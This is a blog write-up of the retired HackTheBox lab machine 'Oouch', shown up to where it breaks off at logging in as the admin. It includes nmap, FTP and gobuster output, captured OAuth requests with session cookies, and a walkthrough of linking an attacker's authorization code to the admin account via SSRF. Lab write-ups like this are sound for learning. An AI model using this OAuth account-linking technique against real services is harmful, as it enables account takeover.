<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="This is relatively an insane box , It revolves around the Oauth2 as feom which we get account linked to qtc (admin) using a SSRF and then a xss in which just gave we have to steal cookies of the user qtc and from that sesion id we logged into api and get the ssh-keys for user.There is a docker running and we can ssh into it.Exploiting the uwsgi to get shell as www-data and then exploiting dbus to get shell as root" /><meta property="og:title" content="Hackthebox Oouch writeup" /><meta property="og:description" content="This is relatively an insane box , It revolves around the Oauth2 as feom which we get account linked to qtc (admin) using a SSRF and then a xss in which just gave we have to steal cookies of the user qtc and from that sesion id we logged into api and get the ssh-keys for user.There is a docker running and we can ssh into it.Exploiting the uwsgi to get shell as www-data and then exploiting dbus to get shell as root" /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/oouch/oouch.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Oouch writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="This is relatively an insane box , It revolves around the Oauth2 as feom which we get account linked to qtc (admin) using a SSRF and then a xss in which just gave we have to steal cookies of the user qtc and from that sesion id we logged into api and get the ssh-keys for user.There is a docker running and we can ssh into it.Exploiting the uwsgi to get shell as www-data and then exploiting dbus to get shell as root"><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/oouch/oouch.png"><title>Hackthebox Oouch writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Oouch writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Oouch writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Mar 14, 2020, 12:00 AM +0800" > Mar 14 <i class="unloaded">2020-03-14T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/oouch.png" class="post-preview-img"><h1 id="information">Information</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Oouch<tr><td>Points<td>40<tr><td>Difficulty<td>Hard<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/103578">QTC</a><tr><td>Out On<td>14 march 2020<tr><td>creator’s Twitter<td><a href="https://twitter.com/qtc_de">@qtc_de</a><tr><td>Retired on<td>1 Aug 2020</table></div><h1 id="briefoouch">Brief@oouch:~$</h1><p>This is relatively an <strong>insane</strong> <code class="language-plaintext highlighter-rouge">box</code> , It revolves around the <code class="language-plaintext highlighter-rouge">Oauth2</code> as feom which we get account linked to <code class="language-plaintext highlighter-rouge">qtc</code> (admin) using a <strong>SSRF</strong> and then a <code class="language-plaintext highlighter-rouge">xss</code> in which just gave we have to <strong>steal</strong> <code class="language-plaintext highlighter-rouge">cookies</code> of the user <code class="language-plaintext highlighter-rouge">qtc</code> and from that sesion id we logged into <code class="language-plaintext highlighter-rouge">api</code> and get the <strong>ssh-keys</strong> for user.There is a <strong>docker</strong> running and we can ssh into it.Exploiting the <code class="language-plaintext highlighter-rouge">uwsgi</code> to get shell as <strong>www-data</strong> and then exploiting <code class="language-plaintext highlighter-rouge">dbus</code> to get shell as <strong>root</strong></p><h1 id="summary">Summary</h1><ul><li>Finding the hidden dir <code class="language-plaintext highlighter-rouge">Oauth</code><li>Getting the token code for the account<li>Using ssrf in Contact page linking the account with <code class="language-plaintext highlighter-rouge">qtc</code><li>Logging in as <code class="language-plaintext highlighter-rouge">qtc</code><li>Making an application and accessing it<li>Getting <code class="language-plaintext highlighter-rouge">sessionid</code> of <code class="language-plaintext highlighter-rouge">qtc</code> Using xss + ssrf with the application we made<li>Getting the access code<li>Getting the ssh private keys of user qtc on <code class="language-plaintext highlighter-rouge">api</code><li>Logging in as <code class="language-plaintext highlighter-rouge">qtc</code><li><code class="language-plaintext highlighter-rouge">Getting User.txt</code><li>Finding the docker ip running on <code class="language-plaintext highlighter-rouge">172.17.8.0/16</code> and <code class="language-plaintext highlighter-rouge">172.18.8.0/16</code><li>Logging in to docker<li>exploting the <code class="language-plaintext highlighter-rouge">uwsgi</code> service running as <code class="language-plaintext highlighter-rouge">www-data</code><li>Finding the routes.py running the dbus as root<li>Exploting the <code class="language-plaintext highlighter-rouge">Dbus To get a shell as root</code><li><code class="language-plaintext highlighter-rouge">Getting root.txt</code></ul><h1 id="got-root">Got Root</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/oouch/oouch.cast" autoplay="1" speed="3" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-p-</span> oouch.htb
Nmap scan report <span class="k">for </span>oouch.htb <span class="o">(</span>10.10.10.177<span class="o">)</span>
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.241
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      Session bandwidth limit <span class="k">in </span>byte/s is 30000
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e <span class="o">(</span>RSA<span class="o">)</span>
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 <span class="o">(</span>ED25519<span class="o">)</span>
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://oouch.htb:5000/login?next<span class="o">=</span>%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     &lt;h1&gt;Bad Request <span class="o">(</span>400<span class="o">)</span>&lt;/h1&gt;
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     &lt;h1&gt;Bad Request <span class="o">(</span>400<span class="o">)</span>&lt;/h1&gt;
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    &lt;h1&gt;Bad Request <span class="o">(</span>400<span class="o">)</span>&lt;/h1&gt;
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=3/8%Time=5E641866%P=x86_64-pc-linux-gnu%r(Get
SF:Request,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h
SF:1&gt;")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Requ
SF:est\x20\(400\)&lt;/h1&gt;")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;
SF:Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\
SF:r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(SIPOptions,63,"SIP/2\.0\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Autho
SF:rization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 846.49 seconds
</span></pre></table></code></div></div><h2 id="port-21">port 21</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>➜  oouch git:<span class="o">(</span>master<span class="o">)</span> ✗ ftp oouch.htb 
Connected to consumer.oouch.htb.
220 qtc<span class="s1">'s development server
Name (oouch.htb:prashant): anonymous
\230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; \ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
</span></pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>➜  oouch git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">cat </span>project.txt 
Flask -&gt; Consumer
Django -&gt; Authorization Server
</pre></table></code></div></div><p>Its just mean nothing to me at begining So, I move on to next port</p><h2 id="port-8000">Port 8000</h2><p>Its was just showing Bad request So….Just moved to another port <a href="/hackthebox/oouch/image-5.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-5.png" alt="Port-5000" /></a></p><h2 id="port-5000">Port 5000</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-1.png" alt="Port-5000" /></p><p>There is a register tab i registered with the</p><ul><li>username: 0xprashant<li>email: phax789@gmail.com<li>password: 123</ul><p>And got access to the application <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-2.png" alt="Port-5000" /></p><p>After that i ran a gobuster with the wordlist seclist-big.txt</p><h2 id="gobuster">Gobuster</h2><p>Gobuster with the wordlist <code class="language-plaintext highlighter-rouge">dirbuster-medium.txt</code> gives me nothing interesting But on changing the Wordlist to <code class="language-plaintext highlighter-rouge">seclists-Big.txt</code> Got a Dir Called <code class="language-plaintext highlighter-rouge">Oauth</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>➜  Desktop git:<span class="o">(</span>master<span class="o">)</span> ✗ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://oouch.htb:5000/ <span class="nt">-w</span> big.txt 
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://consumer.oouch.htb:5000/
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/03/21 09:58:06 Starting gobuster
<span class="o">===============================================================</span>
/about <span class="o">(</span>Status: 302<span class="o">)</span>
/contact <span class="o">(</span>Status: 302<span class="o">)</span>
/documents <span class="o">(</span>Status: 302<span class="o">)</span>
/home <span class="o">(</span>Status: 302<span class="o">)</span>
/login <span class="o">(</span>Status: 200<span class="o">)</span>
/logout <span class="o">(</span>Status: 302<span class="o">)</span>
/oauth <span class="o">(</span>Status: 302<span class="o">)</span>
/profile <span class="o">(</span>Status: 302<span class="o">)</span>
/register <span class="o">(</span>Status: 200<span class="o">)</span>
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>And Going to it `http://oouch.htb/oauth</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-3.png" alt="Port-5000" /></p><p>And Here i got a new subdomain <code class="language-plaintext highlighter-rouge">consumer.oouch.htb</code> I added it to my <code class="language-plaintext highlighter-rouge">hosts</code> file and click on the first link and got redirected to <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/login/</code></p><p>I added this subdomain on the hosts file too</p><p>Now i can access it</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-4.png" alt="Port-5000" /></p><p>And now understood the File <code class="language-plaintext highlighter-rouge">project.txt</code> we got from the ftp server the port 5000 is running on flask and the port 8000 is based on Django framework.</p><p>I found the Oauth that is running on the is of version Oauth2 I got a very good article on exploting the oauth2</p><p><a href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/">https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/</a></p><p>In this article its mentioned how can we link our account with the admin account.Int this article the method is used is <code class="language-plaintext highlighter-rouge">csrf</code> and we already know that there is a <code class="language-plaintext highlighter-rouge">ssrf</code> in the contact page. So we can do it via ssrf.</p><h1 id="attacking-the-oauth">Attacking the Oauth</h1><p>Its Time for attacking the Oauth.We need to get the token code for our own account and.And Enter the Token code with full url in the contact page.As there is a <code class="language-plaintext highlighter-rouge">ssrf</code> so the <code class="language-plaintext highlighter-rouge">qtc</code> will access our url that we sent in contact page.</p><h2 id="register-on-authorizationoouchhtb8000">Register on Authorization.oouch.htb:8000</h2><p>We need to Register on <code class="language-plaintext highlighter-rouge">http://Authorization.oouch.htb:8000</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-6.png" alt="Port-8000" /></p><p>And get back to <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/connect</code></p><h2 id="getting-the-token-code">Getting the token-code</h2><p>Fired up the burp intercept the request</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/oauth/connect</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">consumer.oouch.htb:5000</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://consumer.oouch.htb:5000/oauth</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=.eJxlj8FqwzAQRH9F0TkUyV5ppXxFaQ89lBCk1co2cexgyVAI-feq7bGnZdmZnTcPeclzKCMXefp8SFHbkDcuJQwsj_J15lBYzOsgpkXUVQSidhR1nIq4N82LPD-P_31vPEylbqFO6yLe919T3ueD-OCZ1hsL9XXfWmxY6qF9OB8bxsZllKe67dy2KcmTjKkD74FN8Jw1WbImK88JQTEkNMFpTInZAJHjZKA3BrDTnUbwwWDMtsuaFWaje0jJJecRLFifiDxbpTQ67BxxRAsxRBcRNGqlqfeEfStCZcuXul55aTzMLjUgpROFYBiQ-z5mxzYanVuugww62h_fXnj7K2Hk8xu1rGy8.XnrhEw.1uKY40Etms4DlhXv-43HqvHeKWI</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</pre></table></code></div></div><p>I Forwarded it and got another one</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://consumer.oouch.htb:5000/oauth</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=dB9lD6DHKI5AW7LhVNpEanGDtDpfy8VEIjz8RbbIfogvvmX3j9gUqUKWbX8kI7gl; sessionid=fg196u4hh438xn8kl0g9vw2ematcpe02</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</pre></table></code></div></div><p>I forwarded this one too !! And on my browser i got the following authorize button</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-7.png" alt="Authorize" /></p><p>After clicking on authorize button i got another request</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">266</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=dB9lD6DHKI5AW7LhVNpEanGDtDpfy8VEIjz8RbbIfogvvmX3j9gUqUKWbX8kI7gl; sessionid=fg196u4hh438xn8kl0g9vw2ematcpe02</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="s">csrfmiddlewaretoken=nbamgjrqpDiZ2GyLdVles1bhLUgQdt1TCj4TF9XGEGtO9fIpYEpWUXzarhmRSPPn&amp;redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&amp;scope=read&amp;client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;state=&amp;response_type=code&amp;allow=Authorize</span>
</pre></table></code></div></div><p>And i forward this request too</p><p>And Finally i got the token code</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-8.png" alt="Token-code" /></p><blockquote><p>after getting token code we need to drop the request so because we can only use the token code at one time.If We send the request the account will linked to our own and the token code will be of no use.So drop the last request.</p></blockquote><p>And the token code with full url is <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/connect/token?code=GbcTSxvMWTM6czwwmQ0K5XEJkGEI4W</code></p><h2 id="ssrf-in-contact-page">SSRF in contact page</h2><p>And now here come <code class="language-plaintext highlighter-rouge">ssrf</code> part.Paste the link with the token code we got in the</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-9.png" alt="SSRF" /></p><p>Send the request without any interception. Wait for some time approx 10 sec.And now click on the second link we have in /oauth dir</p><h2 id="login-as-qtc">login as QTC</h2><p><code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/login</code> And we can see a new authorize button showing 